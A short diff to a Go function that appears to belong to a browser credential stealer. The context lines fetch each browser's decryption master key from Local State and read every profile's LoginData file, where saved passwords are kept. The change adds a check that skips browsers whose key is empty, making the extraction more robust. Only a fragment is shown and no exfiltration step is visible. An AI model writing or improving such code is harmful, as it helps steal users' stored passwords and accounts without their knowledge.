@@ -21,6 +21,9 @@ func Get(browsersList []structs.Browser) string {
 			continue
 		}
 		master_key := decryption.GetMasterKey(browser.LocalState)
+		if len(master_key) == 0 {
+			continue
+		}
 		for _, profile := range browser.Profiles {
 			path := profile.LoginData
 
